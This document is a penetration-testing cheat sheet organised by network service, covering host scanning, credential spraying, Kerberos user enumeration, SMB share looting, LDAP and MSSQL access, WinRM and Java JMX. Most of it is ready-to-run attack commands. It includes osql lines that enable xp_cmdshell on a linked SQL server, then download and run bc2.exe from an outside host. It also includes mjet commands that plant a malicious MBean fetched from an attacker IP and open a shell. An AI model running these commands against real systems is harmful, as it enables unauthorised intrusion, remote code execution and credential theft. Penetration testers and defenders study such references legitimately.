## Initial Access  
**Discover the hosts on the network (Linux) :**   
`for i in {1..255};do ping -c 1 192.168.110.$i > /dev/null;if [ $? -eq 0];then echo 192.168.110.$i;fi;done`   
`nmap -Pn -p- -v 192.168.110.1-255`     

**Discover the hosts on the network (Windows) :**     
 `powershell $ping=New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("10.9.10.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }`  
 From an unprivileged account:  Use advanced portscan :   https://www.advanced-port-scanner.com/  
     

**Discover the hosts on the network (Windows) :**
Use PowerSploit's function `Invoke-Portscan` : https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1    
`. .\Invoke-Portscan.ps1`  
`Invoke-Portscan -TopPorts 1000 -Hosts 192.168.210.0/24 -oA results`


**Scan all ports on a host and execute nmap scripts (Linux & Windows):**   
`nmap -A -p- -v 192.168.110.55`  

**Spray creds on several hosts (Linux & Windows):**   
`crackmapexec smb <host> -d <domain> -u <username> -p <password> -H <hash> --shares`  
`crackmapexec winrm 192.168.110.0/24 -u Tom -H '8af1903d3c80c3552a84b6ba299db2ea' --local-auth`  

**Unknown obsolete service:**  
Display known exploits and their EDB-ID : `searchsploit <service_name> --id`  
Copy the exploit to the current directory : `searchsploit <EDB-ID> -m .`  
    
## Port 88 - Kerberos  
Valid usernames can be discovered by brute force against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.   
<br/>
**Windows - User enumeration:**  
`Rubeus.exe brute /users:<userlist.txt> /domain:spookysec.local /password:yolo /dc:<dc_ip>`  
(One fake password is provided so the accounts are not bruteforced)  
  
**Linux - User enumeration:**  
`./kerbrute_linux_amd64 userenum --domain timelapse.htb --dc 10.10.11.152 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`     
<br/>
## Port 135 - MSRPC  
TODO  
<br/>
## Port 445 - SMB
**List SMB shares (python, Linux & Windows):**  
`smbmap -u "Guest" -H "10.10.11.152"`  
`smbclient -U ".\Guest" -L //10.10.11.152`   
    
**Browse SMB shares (python, Linux & Windows):**  
`smbmap -u "Guest" -H "10.10.11.152" -r "IPC$"`   
`smbmap -u 'john' -p 'P@ssw0rd123' -d domain.local -H "192.168.110.10" -r "IPC$"`  
      
**Download SMB files (python, Linux & Windows):**     
`smbmap -u "guest" -H 10.10.11.152 --download "Shares\Dev\winrm_backup.zip"`    
<br/> 
## Ports 389,636,3268,3269 - LDAP  
`nmap -n -sV -Pn --script "ldap* and not brute" 10.10.11.174`    
ldapsearch query:  
`ldapsearch -x -D "cn=leperche,ou=User_Accounts,ou=Users,ou=_NewYork,ou=_AMER,dc=domain,dc=net" -H ldap://YYYYYDC01.domain.net -b "OU=Computers,OU=_NewYork,OU=_AMER,DC=domain,DC=net" -W -E pr=10000/noprompt | tee output-computers.txt`  
 <br/>   
   
 ## Port 1433 - MSSQL
 `PowerUpSQL.ps1` can be used : https://github.com/NetSPI/PowerUpSQL     
 `PowerUpSQL.ps1` cheatsheet : https://github.com/NetSPI/PowerUpSQL  
 Check for vulnerabilities:  
 ```
 Invoke-SQLAudit -Instance 192.168.210.15 -Username 'user' -Password 'pass'
 ```

 The native Windows tool osql can also be used:  
 - Enable xp_cmdshell on a remote instance linked to the local instance to execute system commands remotely:  
   ```osql -E -S "WEBSRV" -Q "EXECUTE('EXEC sp_configure "xp_cmdshell", "1"') AT [sqlsrv.lab.local];"```  
   ```osql -E -S "WEBSRV" -Q "EXECUTE('RECONFIGURE') AT [sqlsrv.lab.local];" ```  
  
- Execute commands:  
  ```osql -E -S "WEBSRV" -Q "EXECUTE('xp_cmdshell ''powershell.exe iwr -Uri http://10.10.16.20:8080/bc2.exe -OutFile c:\Temp\leperche\bc2.exe''') AT [sqlsrv.lab.local];" ```  
  ```osql -E -S "WEBSRV" -Q "EXECUTE('xp_cmdshell ''powershell.exe -c Start-Process -NoNewWindow -FilePath C:\Temp\leperche\bc2.exe''') AT [sqlsrv.lab.local];"```      
        
  
    
## Port 3306 - MySQL   
`PowerUpSQL.ps1` can be used : https://github.com/NetSPI/PowerUpSQL    
    
**Connect to the MySQL service:**  
`mysql -u <user> -p -h localhost`  
  
**Once connected to the DB:**    
Enumerate the databases:  
`SHOW DATABASES;` 
  
Select a database:  
`use <database>`
    
List the database tables:  
`SHOW TABLES;`  
  
See the content of the 'users' table:  
`DESCRIBE users;`  
  
Extract data (password hashes for example) from the 'users' table:  
`SELECT * FROM users;`   
  
  
## Port 3389 - RDP  
From Linux:   
```
xfreerdp -u john -p 'Habile@123!' -v 192.168.210.15
```
      
## Ports 5985,5986 - WinRM  
Using Evil-WinRM (Linux & Windows) :    
`gem install evil-winrm`  
`evil-winrm –i <host> –u <username> [-p <password>] [-H <hash>]`  
   
Using WinRS.exe (native PowerShell client):  
`$ winrs /r:<host> /u:<domain\username> /p:<password> <command>`  
  
Using native PowerShell :    
`PS> $creds = (New-Object System.Management.Automation.PSCredential('admin',(ConvertTo-SecureString 's3cure_PaSsw0rd!' -AsPlainText -Force)))`   
`PS> Enter-PsSession -ComputerName 10.10.11.174 -Credential $creds`   
`PS> Invoke-Command -computername support.htb -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]`   
    
  
## Port XXXX - Java RMI - JMX
**Command execution:**  
Use mjet.py : https://github.com/mogwailabs/mjet   
JMX is used to manage remote Java resources such as MBeans. If no authentication is configured, it is possible to list the differents MBeans:  
Install jdk and use the `jconsole` binary in `\Java\jdk-18.0.2\bin\jconsole.exe` to access the service.  
it is thus possible to install a malicious MBean and execute commands:  
  
Example commands : `jython mjet.py target.test.com 18051 install tonkabean http://<attacker_IP>:6666 6666`  
`jython mjet.py target.test.com 18051 command tonkabean "id"`  
`jython mjet.py target.test.com 18051 shell tonkabean`  
Uninstall the malicious MBean at the end : `jython mjet.py target.test.com 18051 uninstall`    

## Exploitation 
**For web services :**   
TODO Metasploit web_delivery : `TODO`   
  
  
